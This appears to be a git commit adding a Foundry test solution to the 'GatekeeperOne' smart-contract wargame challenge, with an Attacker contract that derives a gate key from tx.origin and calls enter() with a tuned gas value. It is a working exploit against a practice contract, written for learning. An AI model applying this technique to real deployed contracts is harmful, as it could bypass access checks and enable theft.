88aeba58661c9977f979efe88bf8c0ddd51a8471
vesla0x1 <vesla0x1@gmail.com>
2025-02-19 19:24:12 -0300

    feat: add GatekeeperOne solution

--- test/13_GatekeeperOne.t.sol
+++ test/13_GatekeeperOne.t.sol
@@ -4,6 +4,13 @@ pragma solidity ^0.8.13;
 import {Test, console} from "forge-std/Test.sol";
 import {GatekeeperOne} from "../src/13_GatekeeperOne.sol";
 
+contract Attacker {
+    constructor(GatekeeperOne target) {
+        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
+        target.enter{gas: 265 + 8191 * 3}(gateKey);
+    }
+}
+
 contract TestGatekeeperOne is Test {
     address public player = address(0xbad);
     GatekeeperOne public instance;
@@ -17,6 +24,7 @@ contract TestGatekeeperOne is Test {
         vm.startPrank(player);
 
         // Your exploit goes here
+        new Attacker(instance);
 
         vm.stopPrank();
         assertNotEq(instance.entrant(), address(0));
